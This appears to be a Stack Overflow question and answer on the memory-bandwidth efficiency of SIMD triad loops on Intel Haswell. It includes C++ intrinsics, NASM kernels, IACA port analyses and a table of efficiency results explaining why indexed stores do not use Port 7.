<p>Here is the C/C++ Linux code to test this. The NASM code is posted after the C/C++ code. The only thing you have to change is the frequency number. In the line <code>double frequency = 1.3;</code> replace 1.3 with whatever the operating (not nominal) frequency of your processors is (which in case for a i5-4250U with turbo disabled in the BIOS is 1.3 GHz).</p>

<p>Compile with</p>

<pre><code>nasm -f elf64 triad_sse_asm.asm
nasm -f elf64 triad_avx_asm.asm
nasm -f elf64 triad_fma_asm.asm
g++ -m64 -lrt -O3 -mfma  tests.cpp triad_fma_asm.o -o tests_fma
g++ -m64 -lrt -O3 -mavx  tests.cpp triad_avx_asm.o -o tests_avx
g++ -m64 -lrt -O3 -msse2 tests.cpp triad_sse_asm.o -o tests_sse
</code></pre>

<p>The C/C++ code</p>

<pre><code>#include &lt;x86intrin.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;

#define TIMER_TYPE CLOCK_REALTIME

extern ""C"" float triad_sse_asm_repeat(float *x, float *y, float *z, const int n, int repeat);
extern ""C"" float triad_sse_asm_repeat_unroll16(float *x, float *y, float *z, const int n, int repeat);    
extern ""C"" float triad_avx_asm_repeat(float *x, float *y, float *z, const int n, int repeat);
extern ""C"" float triad_avx_asm_repeat_unroll16(float *x, float *y, float *z, const int n, int repeat); 
extern ""C"" float triad_fma_asm_repeat(float *x, float *y, float *z, const int n, int repeat);
extern ""C"" float triad_fma_asm_repeat_unroll16(float *x, float *y, float *z, const int n, int repeat);

#if (defined(__FMA__))
float triad_fma_repeat(float *x, float *y, float *z, const int n, int repeat) {
    float k = 3.14159f;
    int r;
    for(r=0; r&lt;repeat; r++) {
        int i;
        __m256 k4 = _mm256_set1_ps(k);
        for(i=0; i&lt;n; i+=8) {
            _mm256_store_ps(&amp;z[i], _mm256_fmadd_ps(k4, _mm256_load_ps(&amp;y[i]), _mm256_load_ps(&amp;x[i])));
        }
    }
}
#elif (defined(__AVX__))
float triad_avx_repeat(float *x, float *y, float *z, const int n, int repeat) {
    float k = 3.14159f;
    int r;
    for(r=0; r&lt;repeat; r++) {
        int i;
        __m256 k4 = _mm256_set1_ps(k);
        for(i=0; i&lt;n; i+=8) {
            _mm256_store_ps(&amp;z[i], _mm256_add_ps(_mm256_load_ps(&amp;x[i]), _mm256_mul_ps(k4, _mm256_load_ps(&amp;y[i]))));
        }
    }
}
#else
float triad_sse_repeat(float *x, float *y, float *z, const int n, int repeat) {
    float k = 3.14159f;
    int r;
    for(r=0; r&lt;repeat; r++) {
        int i;
        __m128 k4 = _mm_set1_ps(k);
        for(i=0; i&lt;n; i+=4) {
            _mm_store_ps(&amp;z[i], _mm_add_ps(_mm_load_ps(&amp;x[i]), _mm_mul_ps(k4, _mm_load_ps(&amp;y[i]))));
        }
    }
}
#endif

double time_diff(timespec start, timespec end)
{
    timespec temp;
    if ((end.tv_nsec-start.tv_nsec)&lt;0) {
        temp.tv_sec = end.tv_sec-start.tv_sec-1;
        temp.tv_nsec = 1000000000+end.tv_nsec-start.tv_nsec;
    } else {
        temp.tv_sec = end.tv_sec-start.tv_sec;
        temp.tv_nsec = end.tv_nsec-start.tv_nsec;
    }
    return (double)temp.tv_sec +  (double)temp.tv_nsec*1E-9;
}

int main () {
    int bytes_per_cycle = 0;
    double frequency = 1.3;  //Haswell
    //double frequency = 3.6;  //IB
    //double frequency = 2.66;  //Core2
    #if (defined(__FMA__))
    bytes_per_cycle = 96;
    #elif (defined(__AVX__))
    bytes_per_cycle = 48;
    #else
    bytes_per_cycle = 24;
    #endif
    double peak = frequency*bytes_per_cycle;

    const int n =2048;

    float* z2 = (float*)_mm_malloc(sizeof(float)*n, 64);
    char *mem = (char*)_mm_malloc(1&lt;&lt;18,4096);
    char *a = mem;
    char *b = a+n*sizeof(float);
    char *c = b+n*sizeof(float);

    float *x = (float*)a;
    float *y = (float*)b;
    float *z = (float*)c;

    for(int i=0; i&lt;n; i++) {
        x[i] = 1.0f*i;
        y[i] = 1.0f*i;
        z[i] = 0;
    }
    int repeat = 1000000;
    timespec time1, time2;
    #if (defined(__FMA__))
    triad_fma_repeat(x,y,z2,n,repeat);
    #elif (defined(__AVX__))
    triad_avx_repeat(x,y,z2,n,repeat);
    #else
    triad_sse_repeat(x,y,z2,n,repeat);
    #endif

    while(1) {
        double dtime, rate;

        clock_gettime(TIMER_TYPE, &amp;time1);
        #if (defined(__FMA__))
        triad_fma_asm_repeat(x,y,z,n,repeat);
        #elif (defined(__AVX__))
        triad_avx_asm_repeat(x,y,z,n,repeat);
        #else
        triad_sse_asm_repeat(x,y,z,n,repeat);
        #endif
        clock_gettime(TIMER_TYPE, &amp;time2);
        dtime = time_diff(time1,time2);
        rate = 3.0*1E-9*sizeof(float)*n*repeat/dtime;
        printf(""unroll1     rate %6.2f GB/s, efficency %6.2f%%, error %d\n"", rate, 100*rate/peak, memcmp(z,z2, sizeof(float)*n));
        clock_gettime(TIMER_TYPE, &amp;time1);
        #if (defined(__FMA__))
        triad_fma_repeat(x,y,z,n,repeat);
        #elif (defined(__AVX__))
        triad_avx_repeat(x,y,z,n,repeat);
        #else
        triad_sse_repeat(x,y,z,n,repeat);
        #endif
        clock_gettime(TIMER_TYPE, &amp;time2);
        dtime = time_diff(time1,time2);
        rate = 3.0*1E-9*sizeof(float)*n*repeat/dtime;
        printf(""intrinsic   rate %6.2f GB/s, efficency %6.2f%%, error %d\n"", rate, 100*rate/peak, memcmp(z,z2, sizeof(float)*n));
        clock_gettime(TIMER_TYPE, &amp;time1);
        #if (defined(__FMA__))
        triad_fma_asm_repeat_unroll16(x,y,z,n,repeat);
        #elif (defined(__AVX__))
        triad_avx_asm_repeat_unroll16(x,y,z,n,repeat);
        #else
        triad_sse_asm_repeat_unroll16(x,y,z,n,repeat);
        #endif
        clock_gettime(TIMER_TYPE, &amp;time2);
        dtime = time_diff(time1,time2);
        rate = 3.0*1E-9*sizeof(float)*n*repeat/dtime;
        printf(""unroll16    rate %6.2f GB/s, efficency %6.2f%%, error %d\n"", rate, 100*rate/peak, memcmp(z,z2, sizeof(float)*n));
    }
}
</code></pre>

<p>The NASM code using the System V AMD64 ABI.</p>

<p>triad_fma_asm.asm:</p>

<pre><code>global triad_fma_asm_repeat
;RDI x, RSI y, RDX z, RCX n, R8 repeat
;z[i] = y[i] + 3.14159*x[i]
pi: dd 3.14159
;align 16
section .text
    triad_fma_asm_repeat:
    shl             rcx, 2  
    add             rdi, rcx
    add             rsi, rcx
    add             rdx, rcx
    vbroadcastss    ymm2, [rel pi]
    ;neg                rcx 

align 16
.L1:
    mov             rax, rcx
    neg             rax
align 16
.L2:
    vmovaps         ymm1, [rdi+rax]
    vfmadd231ps     ymm1, ymm2, [rsi+rax]
    vmovaps         [rdx+rax], ymm1
    add             rax, 32
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    vzeroupper
    ret

global triad_fma_asm_repeat_unroll16
section .text
    triad_fma_asm_repeat_unroll16:
    shl             rcx, 2
    add             rcx, rdi
    vbroadcastss    ymm2, [rel pi]  
.L1:
    xor             rax, rax
    mov             r9, rdi
    mov             r10, rsi
    mov             r11, rdx
.L2:
    %assign unroll 32
    %assign i 0 
    %rep    unroll
        vmovaps         ymm1, [r9 + 32*i]
        vfmadd231ps     ymm1, ymm2, [r10 + 32*i]
        vmovaps         [r11 + 32*i], ymm1
    %assign i i+1 
    %endrep
    add             r9, 32*unroll
    add             r10, 32*unroll
    add             r11, 32*unroll
    cmp             r9, rcx
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    vzeroupper
    ret
</code></pre>

<p>triad_ava_asm.asm:</p>

<pre><code>global triad_avx_asm_repeat
;RDI x, RSI y, RDX z, RCX n, R8 repeat
pi: dd 3.14159
align 16
section .text
    triad_avx_asm_repeat:
    shl             rcx, 2  
    add             rdi, rcx
    add             rsi, rcx
    add             rdx, rcx
    vbroadcastss    ymm2, [rel pi]
    ;neg                rcx 

align 16
.L1:
    mov             rax, rcx
    neg             rax
align 16
.L2:
    vmulps          ymm1, ymm2, [rdi+rax]
    vaddps          ymm1, ymm1, [rsi+rax]
    vmovaps         [rdx+rax], ymm1
    add             rax, 32
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    vzeroupper
    ret

global triad_avx_asm_repeat2
;RDI x, RSI y, RDX z, RCX n, R8 repeat
;pi: dd 3.14159
align 16
section .text
    triad_avx_asm_repeat2:
    shl             rcx, 2  
    vbroadcastss    ymm2, [rel pi]

align 16
.L1:
    xor             rax, rax
align 16
.L2:
    vmulps          ymm1, ymm2, [rdi+rax]
    vaddps          ymm1, ymm1, [rsi+rax]
    vmovaps         [rdx+rax], ymm1
    add             eax, 32
    cmp             eax, ecx
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    vzeroupper
    ret

global triad_avx_asm_repeat_unroll16
align 16
section .text
    triad_avx_asm_repeat_unroll16:
    shl             rcx, 2
    add             rcx, rdi
    vbroadcastss    ymm2, [rel pi]  
align 16
.L1:
    xor             rax, rax
    mov             r9, rdi
    mov             r10, rsi
    mov             r11, rdx
align 16
.L2:
    %assign unroll 16
    %assign i 0 
    %rep    unroll
        vmulps          ymm1, ymm2, [r9 + 32*i]
        vaddps          ymm1, ymm1, [r10 + 32*i]
        vmovaps         [r11 + 32*i], ymm1
    %assign i i+1 
    %endrep
    add             r9, 32*unroll
    add             r10, 32*unroll
    add             r11, 32*unroll
    cmp             r9, rcx
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    vzeroupper
    ret
</code></pre>

<p>triad_sse_asm.asm:</p>

<pre><code>global triad_sse_asm_repeat
;RDI x, RSI y, RDX z, RCX n, R8 repeat
pi: dd 3.14159
;align 16
section .text
    triad_sse_asm_repeat:
    shl             rcx, 2  
    add             rdi, rcx
    add             rsi, rcx
    add             rdx, rcx
    movss           xmm2, [rel pi]
    shufps          xmm2, xmm2, 0
    ;neg                rcx 
align 16
.L1:
    mov             rax, rcx
    neg             rax
align 16
.L2:
    movaps          xmm1, [rdi+rax]
    mulps           xmm1, xmm2
    addps           xmm1, [rsi+rax]
    movaps          [rdx+rax], xmm1
    add             rax, 16
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    ret

global triad_sse_asm_repeat2
;RDI x, RSI y, RDX z, RCX n, R8 repeat
;pi: dd 3.14159
;align 16
section .text
    triad_sse_asm_repeat2:
    shl             rcx, 2  
    movss           xmm2, [rel pi]
    shufps          xmm2, xmm2, 0
align 16
.L1:
    xor             rax, rax
align 16
.L2:
    movaps          xmm1, [rdi+rax]
    mulps           xmm1, xmm2
    addps           xmm1, [rsi+rax]
    movaps          [rdx+rax], xmm1
    add             eax, 16
    cmp             eax, ecx
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    ret



global triad_sse_asm_repeat_unroll16
section .text
    triad_sse_asm_repeat_unroll16:
    shl             rcx, 2
    add             rcx, rdi
    movss           xmm2, [rel pi]
    shufps          xmm2, xmm2, 0
.L1:
    xor             rax, rax
    mov             r9, rdi
    mov             r10, rsi
    mov             r11, rdx
.L2:
    %assign unroll 8
    %assign i 0 
    %rep    unroll
        movaps          xmm1, [r9 + 16*i]
        mulps           xmm1, xmm2,
        addps           xmm1, [r10 + 16*i]
        movaps          [r11 + 16*i], xmm1
    %assign i i+1 
    %endrep
    add             r9, 16*unroll
    add             r10, 16*unroll
    add             r11, 16*unroll
    cmp             r9, rcx
    jne             .L2
    sub             r8d, 1
    jnz             .L1
    ret
</code></pre>
","<h1>IACA Analysis</h1>

<p>Using <a href=""https://software.intel.com/en-us/articles/intel-architecture-code-analyzer"">IACA (the Intel Architecture Code Analyzer)</a> reveals that macro-op fusion is indeed occurring, and that it is not the problem. It is Mysticial who is correct: <strong>The problem is that the store isn't using Port 7 <em>at all</em></strong>.</p>

<p>IACA reports the following:</p>

<pre><code>Intel(R) Architecture Code Analyzer Version - 2.1
Analyzed File - ../../../tests_fma
Binary Format - 64Bit
Architecture  - HSW
Analysis Type - Throughput

Throughput Analysis Report
--------------------------
Block Throughput: 1.55 Cycles       Throughput Bottleneck: FrontEnd, PORT2_AGU, PORT3_AGU

Port Binding In Cycles Per Iteration:
---------------------------------------------------------------------------------------
|  Port  |  0   -  DV  |  1   |  2   -  D   |  3   -  D   |  4   |  5   |  6   |  7   |
---------------------------------------------------------------------------------------
| Cycles | 0.5    0.0  | 0.5  | 1.5    1.0  | 1.5    1.0  | 1.0  | 0.0  | 1.0  | 0.0  |
---------------------------------------------------------------------------------------

N - port number or number of cycles resource conflict caused delay, DV - Divider pipe (on port 0)
D - Data fetch pipe (on ports 2 and 3), CP - on a critical path
F - Macro Fusion with the previous instruction occurred
* - instruction micro-ops not bound to a port
^ - Micro Fusion happened
# - ESP Tracking sync uop was issued
@ - SSE instruction followed an AVX256 instruction, dozens of cycles penalty is expected
! - instruction not supported, was not accounted in Analysis

| Num Of |                    Ports pressure in cycles                     |    |
|  Uops  |  0  - DV  |  1  |  2  -  D  |  3  -  D  |  4  |  5  |  6  |  7  |    |
---------------------------------------------------------------------------------
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [rdi+rax*1]
|   2    | 0.5       | 0.5 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [rsi+rax*1]
|   2    |           |     | 0.5       | 0.5       | 1.0 |     |     |     | CP | vmovaps ymmword ptr [rdx+rax*1], ymm1
|   1    |           |     |           |           |     |     | 1.0 |     |    | add rax, 0x20
|   0F   |           |     |           |           |     |     |     |     |    | jnz 0xffffffffffffffec
Total Num Of Uops: 6
</code></pre>

<p>In particular, the reported block throughput in cycles (1.5) jives very well with an efficiency of 66%.</p>

<p>A post on <a href=""https://software.intel.com/en-us/articles/intel-architecture-code-analyzer"">IACA's own website</a> about this very phenomenon on <code>Tue, 03/11/2014 - 12:39</code> was met by this reply by an Intel employee on <code>Tue, 03/11/2014 - 23:20</code>:</p>

<blockquote>
  <blockquote>
    <p>Port7 AGU can only work on stores with simple memory address (no index register). This is why the above analysis doesn't show port7 utilization.</p>
  </blockquote>
</blockquote>

<p>This firmly settles why Port 7 wasn't being used.</p>

<p>Now, contrast the above with a 32x unrolled loop (it turns out <code>unroll16</code> shoudl actually be called <code>unroll32</code>):</p>

<pre><code>Intel(R) Architecture Code Analyzer Version - 2.1
Analyzed File - ../../../tests_fma
Binary Format - 64Bit
Architecture  - HSW
Analysis Type - Throughput

Throughput Analysis Report
--------------------------
Block Throughput: 32.00 Cycles       Throughput Bottleneck: PORT2_AGU, Port2_DATA, PORT3_AGU, Port3_DATA, Port4, Port7

Port Binding In Cycles Per Iteration:
---------------------------------------------------------------------------------------
|  Port  |  0   -  DV  |  1   |  2   -  D   |  3   -  D   |  4   |  5   |  6   |  7   |
---------------------------------------------------------------------------------------
| Cycles | 16.0   0.0  | 16.0 | 32.0   32.0 | 32.0   32.0 | 32.0 | 2.0  | 2.0  | 32.0 |
---------------------------------------------------------------------------------------

N - port number or number of cycles resource conflict caused delay, DV - Divider pipe (on port 0)
D - Data fetch pipe (on ports 2 and 3), CP - on a critical path
F - Macro Fusion with the previous instruction occurred
* - instruction micro-ops not bound to a port
^ - Micro Fusion happened
# - ESP Tracking sync uop was issued
@ - SSE instruction followed an AVX256 instruction, dozens of cycles penalty is expected
! - instruction not supported, was not accounted in Analysis

| Num Of |                    Ports pressure in cycles                     |    |
|  Uops  |  0  - DV  |  1  |  2  -  D  |  3  -  D  |  4  |  5  |  6  |  7  |    |
---------------------------------------------------------------------------------
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x20]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x20]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x20], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x40]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x40]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x40], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x60]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x60]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x60], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x80]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x80]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x80], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0xa0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0xa0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0xa0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0xc0]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0xc0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0xc0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0xe0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0xe0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0xe0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x100]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x100]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x100], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x120]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x120]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x120], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x140]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x140]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x140], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x160]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x160]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x160], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x180]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x180]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x180], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x1a0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x1a0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x1a0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x1c0]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x1c0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x1c0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x1e0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x1e0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x1e0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x200]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x200]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x200], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x220]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x220]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x220], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x240]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x240]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x240], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x260]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x260]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x260], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x280]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x280]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x280], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x2a0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x2a0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x2a0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x2c0]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x2c0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x2c0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x2e0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x2e0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x2e0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x300]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x300]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x300], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x320]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x320]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x320], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x340]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x340]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x340], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x360]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x360]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x360], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x380]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x380]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x380], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x3a0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x3a0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x3a0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x3c0]
|   2^   | 1.0       |     |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x3c0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x3c0], ymm1
|   1    |           |     | 1.0   1.0 |           |     |     |     |     | CP | vmovaps ymm1, ymmword ptr [r9+0x3e0]
|   2^   |           | 1.0 |           | 1.0   1.0 |     |     |     |     | CP | vfmadd231ps ymm1, ymm2, ymmword ptr [r10+0x3e0]
|   2^   |           |     |           |           | 1.0 |     |     | 1.0 | CP | vmovaps ymmword ptr [r11+0x3e0], ymm1
|   1    |           |     |           |           |     | 1.0 |     |     |    | add r9, 0x400
|   1    |           |     |           |           |     |     | 1.0 |     |    | add r10, 0x400
|   1    |           |     |           |           |     | 1.0 |     |     |    | add r11, 0x400
|   1    |           |     |           |           |     |     | 1.0 |     |    | cmp r9, rcx
|   0F   |           |     |           |           |     |     |     |     |    | jnz 0xfffffffffffffcaf
Total Num Of Uops: 164
</code></pre>

<p>We see here micro-fusion and correct scheduling of the store to Port 7.</p>

<h1>Manual Analysis (see edit above)</h1>

<p>I can now answer the second of your questions: <strong>Is this possible without unrolling and if so how can it be done?</strong>. The answer is no.</p>

<p>I padded the arrays <code>x</code>, <code>y</code> and <code>z</code> to the left and right with plenty of buffer for the below experiment, and changed the inner loop to the following:</p>

<pre><code>.L2:
vmovaps         ymm1, [rdi+rax] ; 1L
vmovaps         ymm0, [rsi+rax] ; 2L
vmovaps         [rdx+rax], ymm2 ; S1
add             rax, 32         ; ADD
jne             .L2             ; JMP
</code></pre>

<p>This intentionally does not use FMA (only loads and stores) and all load/store instructions have no dependencies, since there should therefore be no hazards whatever preventing their issue into any execution ports.</p>

<p>I then tested every single permutation of the first and second loads (<code>1L</code> and <code>2L</code>), the store (<code>S1</code>) and the add (<code>A</code>) while leaving the conditional jump (<code>J</code>) at the end, and for each of these I tested every possible combination of offsets of <code>x</code>, <code>y</code> and <code>z</code> by 0 or -32 bytes (to correct for the fact that reordering the <code>add rax, 32</code> before one of the <code>r+r</code> indexes would cause the load or store to target the wrong address). The loop was aligned to 32 bytes. The tests were run on a 2.4GHz i7-4700MQ with TurboBoost disabled by means of <code>echo '0' &gt; /sys/devices/system/cpu/cpufreq/boost</code> under Linux, and using 2.4 for the frequency constant. Here are the efficiency results (<em>maximum of 24</em>):</p>

<pre><code>Cases: 0           1           2           3           4           5           6           7
       L1  L2  S   L1  L2  S   L1  L2  S   L1  L2  S   L1  L2  S   L1  L2  S   L1  L2  S   L1  L2  S   
       -0  -0  -0  -0  -0  -32 -0  -32 -0  -0  -32 -32 -32 -0  -0  -32 -0  -32 -32 -32 -0  -32 -32 -32
       ________________________________________________________________________________________________
12SAJ: 65.34%      65.34%      49.63%      65.07%      49.70%      65.05%      49.22%      65.07%
